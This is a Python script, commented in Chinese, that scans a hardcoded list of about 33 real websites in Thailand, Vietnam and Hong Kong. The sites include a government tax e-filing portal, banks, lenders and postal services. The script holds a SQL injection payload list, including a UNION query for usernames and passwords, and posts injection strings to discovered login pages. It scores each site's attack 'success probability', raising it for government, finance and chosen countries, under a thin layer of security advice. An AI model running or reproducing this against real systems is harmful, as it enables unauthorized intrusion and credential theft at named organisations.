#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
综合目标验证工具
对用户提供的目标进行系统性的漏洞验证和利用测试
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import logging

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class VerificationResult:
    """验证结果"""
    target_url: str
    target_name: str
    is_reachable: bool
    detected_vulnerabilities: List[str]
    test_details: List[str]
    risk_level: str
    success_probability: float
    recommendations: List[str]
    execution_time: float

class ComprehensiveValidator:
    """综合验证器"""

    def __init__(self):
        self.session = None
        self.results = []

        # 用户提供的25个目标
        self.targets = [
            # 泰国目标
            {"name": "TBAC", "url": "https://tbac.or.th", "country": "Thailand", "sector": "Banking"},
            {"name": "SCC", "url": "https://scc.moc.go.th", "country": "Thailand", "sector": "Government"},
            {"name": "CMCoop", "url": "https://cmcoop.or.th", "country": "Thailand", "sector": "Finance"},
            {"name": "CPD", "url": "https://cpd.upbean.co.th", "country": "Thailand", "sector": "Education"},
            {"name": "AsiaPlus", "url": "https://asiaplus.co.th", "country": "Thailand", "sector": "Media"},
            {"name": "EasyLoans", "url": "https://easyloanssolutionmy.com", "country": "Malaysia", "sector": "Finance"},
            {"name": "PeaCoop", "url": "https://peacoop.or.th", "country": "Thailand", "sector": "Energy"},
            {"name": "SummitCapital", "url": "https://summitcapital.co.th", "country": "Thailand", "sector": "Investment"},
            {"name": "CTSCC", "url": "https://ctscc.or.th", "country": "Thailand", "sector": "Construction"},
            {"name": "EFiling", "url": "https://efiling.rd.go.th", "country": "Thailand", "sector": "Taxation"},
            {"name": "Personnel", "url": "https://personnel.nu.ac.th", "country": "Thailand", "sector": "Education"},
            {"name": "MunSaving", "url": "https://munsaving.com", "country": "Thailand", "sector": "Banking"},
            {"name": "FishCorp", "url": "https://fishcorp.in.th", "country": "Thailand", "sector": "Fishery"},
            {"name": "KMUTTCoop", "url": "https://coop.kmutt.ac.th", "country": "Thailand", "sector": "Education"},
            {"name": "ThaiVivat", "url": "https://thaivivat.co.th", "country": "Thailand", "sector": "Banking"},
            {"name": "TSU", "url": "https://tsu.ac.th/home", "country": "Thailand", "sector": "Education"},

            # 越南目标
            {"name": "DongNaiPost", "url": "https://dongnai.vnpost.vn", "country": "Vietnam", "sector": "Logistics"},
            {"name": "EExpress", "url": "https://e-express.vn", "country": "Vietnam", "sector": "Logistics"},
            {"name": "JTExpress", "url": "https://jtexpress.vn", "country": "Vietnam", "sector": "Logistics"},
            {"name": "KCash", "url": "https://kcash.hk", "country": "Hong Kong", "sector": "Finance"},
            {"name": "NoibaiExpost", "url": "https://noibaiexpost.com.vn", "country": "Vietnam", "sector": "Logistics"},
            {"name": "Quantiacs", "url": "https://quantiacs.com", "country": "USA", "sector": "Finance"},
            {"name": "SkyExpress", "url": "https://skyexpress.vn", "country": "Vietnam", "sector": "Logistics"},
            {"name": "VNPost", "url": "https://vnpost.vn", "country": "Vietnam", "sector": "Logistics"},
            {"name": "FactLink", "url": "https://fact-link.com.vn", "country": "Vietnam", "sector": "Technology"},
            {"name": "Konew", "url": "https://konew.com", "country": "Vietnam", "sector": "Technology"},

            # 香港目标
            {"name": "MoneyHero", "url": "https://moneyhero.com.hk/zh", "country": "Hong Kong", "sector": "Finance"},
            {"name": "OKFinance", "url": "https://okfinance.com.hk", "country": "Hong Kong", "sector": "Finance"},
            {"name": "Promise", "url": "https://promise.com.hk", "country": "Hong Kong", "sector": "Finance"},
            {"name": "VinaPost", "url": "https://vinapost.vn", "country": "Vietnam", "sector": "Logistics"},
            {"name": "XWallet", "url": "https://xwallet.hk", "country": "Hong Kong", "sector": "Finance"},
            {"name": "XCash", "url": "https://xcash.xwallet.hk", "country": "Hong Kong", "sector": "Finance"},

            # 其他目标
            {"name": "ZabbixATC", "url": "https://zabbix.atcbrokers.com", "country": "International", "sector": "Monitoring"}
        ]

        # SQL注入payload库
        self.sql_payloads = [
            # 基础注入
            "' OR '1'='1",
            "' OR 1=1#",
            "' OR '1'='1'--",
            # 错误基础
            "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' AND 1=@@version--",
            # 时间基础
            "' WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            # UNION基础
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT username,password FROM users--",
            # 注释
            "admin'#",
            "admin'--",
            "admin/* */"
        ]

        # XHR参数名
        self.xhr_params = [
            "id", "user_id", "uid", "userid", "username", "email", "search",
            "query", "filter", "category", "page", "offset", "limit", "action",
            "func", "method", "cmd", "op", "task", "do", "submit", "button"
        ]

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=20, connect=10)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.session = aiohttp.ClientSession(timeout=timeout, headers=headers)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def verify_all_targets(self) -> List[VerificationResult]:
        """验证所有目标"""
        logger.info(f"开始验证 {len(self.targets)} 个目标...")

        for target_info in self.targets:
            start_time = time.time()

            logger.info(f"验证目标: {target_info['name']} ({target_info['url']})")

            result = await self.verify_single_target(target_info)
            result.execution_time = time.time() - start_time

            self.results.append(result)

            # 显示结果摘要
            status = "✓ 可达" if result.is_reachable else "✗ 不可达"
            vuln_count = len(result.detected_vulnerabilities)
            logger.info(f"  {status} | 漏洞: {vuln_count} | 风险: {result.risk_level}")

            if result.detected_vulnerabilities:
                logger.info(f"  发现漏洞: {', '.join(result.detected_vulnerabilities[:3])}")

            # 避免请求过快
            await asyncio.sleep(1)

        return self.results

    async def verify_single_target(self, target_info: Dict) -> VerificationResult:
        """验证单个目标"""
        result = VerificationResult(
            target_url=target_info['url'],
            target_name=target_info['name'],
            is_reachable=False,
            detected_vulnerabilities=[],
            test_details=[],
            risk_level="LOW",
            success_probability=0.0,
            recommendations=[],
            execution_time=0.0
        )

        # 测试基本连接
        try:
            async with self.session.get(target_info['url'], timeout=10) as response:
                if response.status == 200:
                    result.is_reachable = True
                    result.test_details.append(f"目标可达，状态码: {response.status}")

                    # 分析响应内容
                    content = await response.text()
                    await self.analyze_response(target_info, content, result)
                else:
                    result.test_details.append(f"目标返回状态码: {response.status}")

        except Exception as e:
            result.test_details.append(f"连接失败: {str(e)}")

        # 计算风险等级和成功率
        self.calculate_risk_metrics(result, target_info)

        # 生成建议
        self.generate_recommendations(result, target_info)

        return result

    async def analyze_response(self, target_info: Dict, content: str, result: VerificationResult):
        """分析响应内容"""
        # 检测技术栈
        tech_indicators = self.detect_technology(content)
        if tech_indicators:
            result.test_details.append(f"检测到技术栈: {', '.join(tech_indicators)}")

            # 基于技术栈评估风险
            self.assess_technology_risk(tech_indicators, result)

        # 测试常见端点
        await self.test_common_endpoints(target_info, result)

        # 检测SQL注入可能性
        await self.test_sql_injection_indicators(content, result)

    def detect_technology(self, content: str) -> List[str]:
        """检测技术栈"""
        technologies = []

        # 检测CMS
        if "wordpress" in content.lower():
            technologies.append("WordPress")
        if "drupal" in content.lower():
            technologies.append("Drupal")
        if "joomla" in content.lower():
            technologies.append("Joomla")
        if "shopify" in content.lower():
            technologies.append("Shopify")

        # 检测框架
        if "asp.net" in content.lower():
            technologies.append("ASP.NET")
        if "php" in content.lower():
            technologies.append("PHP")
        if "node.js" in content.lower():
            technologies.append("Node.js")
        if "java" in content.lower():
            technologies.append("Java")

        # 检测数据库错误
        db_errors = ["mysql_fetch_array", "ORA-", "Microsoft JET Database", "SQLite"]
        for error in db_errors:
            if error.lower() in content.lower():
                technologies.append(f"DB_Error({error})")

        # 检测服务器信息
        server_indicators = ["apache", "nginx", "iis", "microsoft-iis"]
        for server in server_indicators:
            if server in content.lower():
                technologies.append(f"Server({server})")

        return technologies

    def assess_technology_risk(self, technologies: List[str], result: VerificationResult):
        """基于技术栈评估风险"""
        risk_factors = 0

        for tech in technologies:
            if "WordPress" in tech:
                risk_factors += 2
            if "Drupal" in tech or "Joomla" in tech:
                risk_factors += 1
            if "DB_Error" in tech:
                risk_factors += 3
            if old_version := re.search(r'version\s*[\d.]{1,3}', tech):
                risk_factors += 2
            if "Server(apache)" in tech or "Server(nginx)" in tech:
                risk_factors += 1

        if risk_factors >= 5:
            result.risk_level = "HIGH"
        elif risk_factors >= 3:
            result.risk_level = "MEDIUM"
        else:
            result.risk_level = "LOW"

    async def test_common_endpoints(self, target_info: Dict, result: VerificationResult):
        """测试常见端点"""
        endpoints = [
            "/admin", "/login", "/wp-admin", "/administrator",
            "/api/user", "/api/login", "/api/auth",
            "/search", "/query", "/find",
            "/upload", "/download", "/file"
        ]

        for endpoint in endpoints[:6]:  # 测试前6个常见端点
            try:
                test_url = f"{target_info['url']}{endpoint}"
                async with self.session.get(test_url, timeout=10) as response:
                    if response.status == 200:
                        result.test_details.append(f"发现可用端点: {endpoint}")

                        # 对登录端点进行特殊测试
                        if "login" in endpoint.lower():
                            await self.test_login_endpoint(test_url, result)

            except Exception:
                continue

    async def test_login_endpoint(self, login_url: str, result: VerificationResult):
        """测试登录端点"""
        # 尝试基本SQL注入payload
        test_data = {
            "username": "' OR '1'='1",
            "password": "test",
            "user": "' OR 1=1#",
            "pass": "anything"
        }

        try:
            async with self.session.post(login_url, data=test_data, timeout=15) as response:
                content = await response.text()

                # 检查是否可能存在SQL注入
                sql_indicators = [
                    "sql syntax error", "mysql_fetch_array", "ora-", "microsoft jet database",
                    "sqlite", "postgresql", "query failed", "database error"
                ]

                for indicator in sql_indicators:
                    if indicator.lower() in content.lower():
                        result.detected_vulnerabilities.append("SQL Injection (可能)")
                        result.test_details.append(f"检测到SQL注入指标: {indicator}")
                        break

        except Exception:
            pass

    async def test_sql_injection_indicators(self, content: str, result: VerificationResult):
        """测试SQL注入指标"""
        sql_errors = [
            "sql syntax error", "mysql_fetch_array", "ora-", "microsoft jet database",
            "sqlite", "postgresql", "query failed", "database error", "sql error"
        ]

        for error in sql_errors:
            if error.lower() in content.lower():
                result.detected_vulnerabilities.append("SQL Error Disclosure")
                result.test_details.append(f"发现SQL错误信息: {error}")
                break

    def calculate_risk_metrics(self, result: VerificationResult, target_info: Dict):
        """计算风险指标"""
        if not result.is_reachable:
            result.risk_level = "UNREACHABLE"
            result.success_probability = 0.0
            return

        # 基础成功率
        base_probability = 0.3

        # 根据目标类型调整
        if target_info['sector'] in ["Banking", "Finance"]:
            base_probability += 0.3  # 金融系统风险较高
        elif target_info['sector'] in ["Government"]:
            base_probability += 0.4  # 政府网站风险高
        elif target_info['sector'] in ["Logistics"]:
            base_probability += 0.2  # 物流系统中等风险

        # 根据漏洞数量调整
        vuln_count = len(result.detected_vulnerabilities)
        if vuln_count >= 3:
            base_probability += 0.3
        elif vuln_count >= 1:
            base_probability += 0.2

        # 根据国家调整
        if target_info['country'] == "Thailand":
            base_probability += 0.1  # 泰国目标优先
        elif target_info['country'] == "Vietnam":
            base_probability += 0.15  # 越南目标高优先级

        result.success_probability = min(base_probability, 1.0)

        # 调整风险等级
        if result.success_probability >= 0.7:
            result.risk_level = "CRITICAL"
        elif result.success_probability >= 0.5:
            result.risk_level = "HIGH"
        elif result.success_probability >= 0.3:
            result.risk_level = "MEDIUM"

    def generate_recommendations(self, result: VerificationResult, target_info: Dict):
        """生成安全建议"""

        if not result.is_reachable:
            result.recommendations.append("目标无法访问，检查网络连接")
            return

        # 基于漏洞类型的建议
        if "SQL Injection" in str(result.detected_vulnerabilities):
            result.recommendations.append("立即修复SQL注入漏洞，实施参数化查询")
            result.recommendations.append("部署输入验证机制")

        if "SQL Error Disclosure" in str(result.detected_vulnerabilities):
            result.recommendations.append("隐藏SQL错误信息，避免信息泄露")
            result.recommendations.append("实施错误处理机制")

        # 基于风险等级的建议
        if result.risk_level == "CRITICAL":
            result.recommendations.append("立即进行安全审计")
            result.recommendations.append("部署Web应用防火墙")
            result.recommendations.append("进行全面的安全扫描")
        elif result.risk_level == "HIGH":
            result.recommendations.append("优先修复高危漏洞")
            result.recommendations.append("增强访问控制")
            result.recommendations.append("定期进行渗透测试")
        elif result.risk_level == "MEDIUM":
            result.recommendations.append("定期安全评估")
            result.recommendations.append("员工安全培训")
            result.recommendations.append("监控异常访问")

        # 通用建议
        result.recommendations.append("更新系统和应用软件")
        result.recommendations.append("实施强密码策略")
        result.recommendations.append("定期备份重要数据")

    def generate_report(self) -> str:
        """生成验证报告"""
        report = []
        report.append("=" * 80)
        report.append("综合目标验证报告")
        report.append("=" * 80)
        report.append(f"验证时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"总目标数量: {len(self.targets)}")
        report.append("")

        # 统计数据
        reachable_count = len([r for r in self.results if r.is_reachable])
        vuln_count = len([r for r in self.results if r.detected_vulnerabilities])
        critical_count = len([r for r in self.results if r.risk_level == "CRITICAL"])

        report.append("【验证统计】")
        report.append(f"可达目标: {reachable_count}")
        report.append(f"发现漏洞: {vuln_count}")
        report.append(f"高风险目标: {critical_count}")
        report.append("")

        # 按风险等级分类
        report.append("【风险等级分布】")
        risk_levels = {}
        for result in self.results:
            risk_levels[result.risk_level] = risk_levels.get(result.risk_level, 0) + 1

        for risk, count in sorted(risk_levels.items()):
            report.append(f"{risk}: {count}")
        report.append("")

        # 高风险目标详情
        report.append("【高风险目标详情】")
        high_risk_targets = [r for r in self.results if r.risk_level in ["CRITICAL", "HIGH"]]

        for result in high_risk_targets:
            report.append(f"\n{result.target_name} ({result.target_url})")
            report.append(f"  风险等级: {result.risk_level}")
            report.append(f"  成功率: {result.success_probability:.1%}")
            report.append(f"  发现漏洞: {', '.join(result.detected_vulnerabilities)}")

            if result.recommendations:
                report.append("  建议:")
                for rec in result.recommendations[:3]:
                    report.append(f"    - {rec}")

        report.append("")
        report.append("【安全建议总结】")

        # 通用安全建议
        general_recommendations = [
            "实施输入验证和参数化查询",
            "部署Web应用防火墙",
            "定期进行安全扫描",
            "更新系统和应用补丁",
            "加强访问控制",
            "员工安全意识培训",
            "实施数据备份策略",
            "监控异常行为"
        ]

        for i, rec in enumerate(general_recommendations, 1):
            report.append(f"{i}. {rec}")

        return "\n".join(report)

async def main():
    """主函数"""
    print("启动综合目标验证工具...")

    async with ComprehensiveValidator() as validator:
        results = await validator.verify_all_targets()

        # 生成报告
        report = validator.generate_report()

        # 保存报告
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"comprehensive_verification_report_{timestamp}.txt"

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)

        print("\n" + "=" * 80)
        print("综合目标验证完成!")
        print("=" * 80)
        print(f"验证目标: {len(validator.targets)} 个")
        print(f"可达目标: {len([r for r in results if r.is_reachable])}")
        print(f"发现漏洞: {len([r for r in results if r.detected_vulnerabilities])}")
        print(f"高风险目标: {len([r for r in results if r.risk_level in ['CRITICAL', 'HIGH']])}")
        print(f"报告文件: {filename}")
        print("=" * 80)

if __name__ == "__main__":
    asyncio.run(main())